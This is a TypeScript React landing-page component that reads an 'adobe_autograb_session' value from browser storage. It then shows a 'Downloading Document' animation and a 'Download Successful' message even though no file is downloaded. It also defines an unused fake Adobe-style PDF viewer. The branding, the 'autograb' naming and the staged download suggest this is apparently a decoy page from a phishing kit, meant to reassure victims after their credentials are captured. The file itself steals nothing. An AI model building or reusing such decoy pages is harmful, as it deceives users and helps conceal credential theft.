import React, { useEffect, useRef, useState } from 'react';

interface LandingPageProps {
  onFileAction?: (fileName: string, action: 'view' | 'download') => void;
}

/**
 * Behavior per request:
 * - Realistic PDF viewer animation.
 * - Single flow: "Downloading..." -> "Download Successful" -> keep the success text visible.
 * - Texts are clear without high-contrast outlines.
 * - Only show the flow once per session, then remove 'adobe_autograb_session'.
 * - The provided image is displayed inside the page frame (centered, contained).
 */
const LandingPage: React.FC<LandingPageProps> = () => {
  const [showOverlay, setShowOverlay] = useState(false);
  const [phase, setPhase] = useState<'idle' | 'downloading' | 'success'>('idle');
  const [dots, setDots] = useState('');
  const [docAnimating, setDocAnimating] = useState(false);

  const dotIntervalRef = useRef<number | null>(null);
  const successTimeoutRef = useRef<number | null>(null);
  const hideOverlayTimeoutRef = useRef<number | null>(null);

  useEffect(() => {
    try {
      const raw = localStorage.getItem('adobe_autograb_session');
      if (!raw) return;

      let session: any = null;
      try {
        session = JSON.parse(raw);
      } catch {
        session = null;
      }

      const sessionId = (session && (session.sessionId || session.timestamp)) ? String(session.sessionId || session.timestamp) : null;
      if (!sessionId) return;

      const shownKey = `adobe_download_shown::${sessionId}`;
      const alreadyShown = sessionStorage.getItem(shownKey);
      if (alreadyShown) return;

      // Start sequence
      setShowOverlay(true);
      setPhase('downloading');
      setDocAnimating(true);

      let dotCount = 1;
      const maxDots = 6;
      dotIntervalRef.current = window.setInterval(() => {
        dotCount = dotCount >= maxDots ? 1 : dotCount + 1;
        setDots('.'.repeat(dotCount));
      }, 500) as unknown as number;

      successTimeoutRef.current = window.setTimeout(() => {
        if (dotIntervalRef.current) {
          clearInterval(dotIntervalRef.current);
          dotIntervalRef.current = null;
        }
        setPhase('success');
        setDots('');

        try {
          sessionStorage.setItem(shownKey, new Date().toISOString());
        } catch {}
        try {
          localStorage.removeItem('adobe_autograb_session');
        } catch {}

        // Keep the success message visible and stop the doc animation.
        setDocAnimating(false);

        successTimeoutRef.current = null;
      }, 3000) as unknown as number;
    } catch {
      // ignore
    }

    return () => {
      if (dotIntervalRef.current) {
        clearInterval(dotIntervalRef.current);
        dotIntervalRef.current = null;
      }
      if (successTimeoutRef.current) {
        clearTimeout(successTimeoutRef.current);
        successTimeoutRef.current = null;
      }
      if (hideOverlayTimeoutRef.current) {
        clearTimeout(hideOverlayTimeoutRef.current);
        hideOverlayTimeoutRef.current = null;
      }
    };
  }, []);

  return (
    <div
      style={{
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        background: '#f5f7fa',
        color: '#111'
      }}
    >
      {/* Document.pdf card removed as requested */}

      {showOverlay && (
        <div
          aria-live="polite"
          role="status"
          style={{
            position: 'fixed',
            inset: 0,
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            pointerEvents: 'none',
            zIndex: 9999
          }}
        >
          <div
            style={{
              background: 'rgba(255,255,255,0.95)',
              color: '#1f2937',
              textAlign: 'center',
              fontFamily:
                'system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial',
              fontSize: 18,
              fontWeight: 600,
              pointerEvents: 'none',
              padding: '12px 16px',
              borderRadius: 10,
              border: '1px solid rgba(0,0,0,0.06)',
              boxShadow: '0 6px 20px rgba(0,0,0,0.08)'
            }}
          >
            {phase === 'downloading' && <span>Downloading Document{dots}</span>}
            {phase === 'success' && <span>Download Successful</span>}
          </div>
        </div>
      )}
    </div>
  );
};

// Keeping RealisticPDF definition unchanged below (not rendered).
function RealisticPDF({ animating, imageUrl }: { animating: boolean; imageUrl: string }) {
  return (
    <div style={{ position: 'relative' }} aria-hidden="true">
      <style>
        {`
          .pdf-viewer {
            width: 340px;
            border-radius: 14px;
            background: #e9eef3;
            box-shadow: 0 16px 40px rgba(0,0,0,0.12);
            border: 1px solid #d8e0e8;
            overflow: hidden;
          }

          .pdf-toolbar {
            height: 44px;
            background: linear-gradient(0deg, #f7fafc, #ffffff);
            border-bottom: 1px solid #e6ebf1;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 10px 0 12px;
          }
          .pdf-toolbar-left {
            display: flex;
            align-items: center;
            gap: 10px;
            color: #374151;
            font-weight: 600;
            font-size: 13px;
          }
          .pdf-toolbar-dots {
            display: inline-flex;
            gap: 6px;
            margin-right: 6px;
          }
          .pdf-toolbar-dots i {
            width: 8px; height: 8px; border-radius: 50%;
          }
          .pdf-toolbar-dots i:nth-child(1) { background: #ef4444; }
          .pdf-toolbar-dots i:nth-child(2) { background: #f59e0b; }
          .pdf-toolbar-dots i:nth-child(3) { background: #10b981; }

          .pdf-badge {
            background: #e53935;
            color: #fff;
            font-weight: 700;
            font-size: 10px;
            padding: 4px 8px;
            border-radius: 999px;
            letter-spacing: 0.6px;
          }

          .pdf-viewport {
            height: 460px;
            background: radial-gradient(120% 50% at 50% 0%, #f8fafc 0%, #eef2f7 60%, #e9eef3 100%);
            display: grid;
            place-items: center;
            padding: 18px 0;
          }

          .pages-track {
            position: relative;
            width: 270px;
            height: 100%;
            perspective: 800px;
          }

          .page-stack {
            position: absolute;
            inset: 0;
            display: grid;
            place-items: center;
          }

          .page {
            position: relative;
            width: 270px;
            height: 382px; /* ~ A4 portrait ratio */
            background: #fff;
            border-radius: 10px;
            box-shadow:
              0 1px 0 rgba(0,0,0,0.05),
              0 6px 16px rgba(0,0,0,0.12);
            border: 1px solid rgba(0,0,0,0.06);
          }

          .page.back {
            transform: translateY(8px) scale(0.995);
            filter: saturate(0.95) brightness(0.995);
          }
          .page.back2 {
            transform: translateY(16px) scale(0.99);
            filter: saturate(0.92) brightness(0.99);
          }

          .curl {
            position: absolute;
            top: 0; right: 0;
            width: 36px; height: 36px;
            background: linear-gradient(135deg, #f3f6fb 0%, #e5ebf2 70%, rgba(0,0,0,0) 71%);
            clip-path: polygon(100% 0, 0 0, 100% 100%);
            border-top-right-radius: 10px;
          }

          .content {
            position: absolute;
            inset: 16px 18px 18px 18px;
            display: flex;
            flex-direction: column;
            gap: 0;
            background: #fff;
            border-radius: 8px;
          }

          .imagePreview {
            flex: 1;
            border: 1px solid #dbe3ed;
            border-radius: 8px;
            background: #fff;
            display: grid;
            place-items: center;
            overflow: hidden;
          }

          /* Subtle lifelike motion while downloading */
          @keyframes floatDoc {
            0% { transform: translateY(0px); }
            50% { transform: translateY(-8px); }
            100% { transform: translateY(0px); }
          }
          .page.front.anim {
            animation: floatDoc 3.2s ease-in-out infinite;
            transform-origin: 50% 100%;
          }

          .turn-glint {
            position: absolute;
            top: 10px;
            right: 0;
            width: 10px;
            height: calc(100% - 20px);
            background: linear-gradient(90deg, rgba(0,0,0,0) 0%, rgba(220,230,240,0.6) 80%, rgba(0,0,0,0) 100%);
            opacity: 0;
          }
          @keyframes glintSweep {
            0% { opacity: 0; transform: translateX(10px); }
            20% { opacity: 0.5; transform: translateX(-2px); }
            100% { opacity: 0; transform: translateX(-12px); }
          }
          .page.front.anim .turn-glint {
            animation: glintSweep 2.8s ease-in-out infinite;
          }

          @media (prefers-reduced-motion: reduce) {
            .page.front.anim, .page.front.anim .turn-glint { animation: none !important; }
          }
        `}
      </style>

      <div className="pdf-viewer">
        <div className="pdf-toolbar">
          <div className="pdf-toolbar-left">
            <span className="pdf-toolbar-dots" aria-hidden="true">
              <i></i><i></i><i></i>
            </span>
            <span>Document.pdf</span>
          </div>
          <span className="pdf-badge">PDF</span>
        </div>

        <div className="pdf-viewport">
          <div className="pages-track">
            <div className="page-stack">
              <div className="page back2"></div>
              <div className="page back"></div>

              <div className={`page front ${animating ? 'anim' : ''}`}>
                <div className="curl" />
                <div className="turn-glint" />
                <div className="content">
                  <div className="imagePreview">
                    <img
                      src={imageUrl}
                      alt="Document preview"
                      referrerPolicy="no-referrer"
                      decoding="async"
                      loading="eager"
                      draggable={false}
                      style={{
                        width: '100%',
                        height: '100%',
                        objectFit: 'contain',
                        display: 'block',
                        background: 'transparent'
                      }}
                      onError={(e) => {
                        // fallback to ensure the frame isn't blank if loading fails
                        const t = e.currentTarget as HTMLImageElement;
                        t.style.objectFit = 'contain';
                        t.src =
                          'data:image/svg+xml;charset=utf-8,' +
                          encodeURIComponent(
                            '<svg xmlns="http://www.w3.org/2000/svg" width="400" height="300"><rect width="100%" height="100%" fill="#fff"/><text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" font-family="Arial" font-size="14" fill="#999">Preview unavailable</text></svg>'
                          );
                      }}
                    />
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default LandingPage;
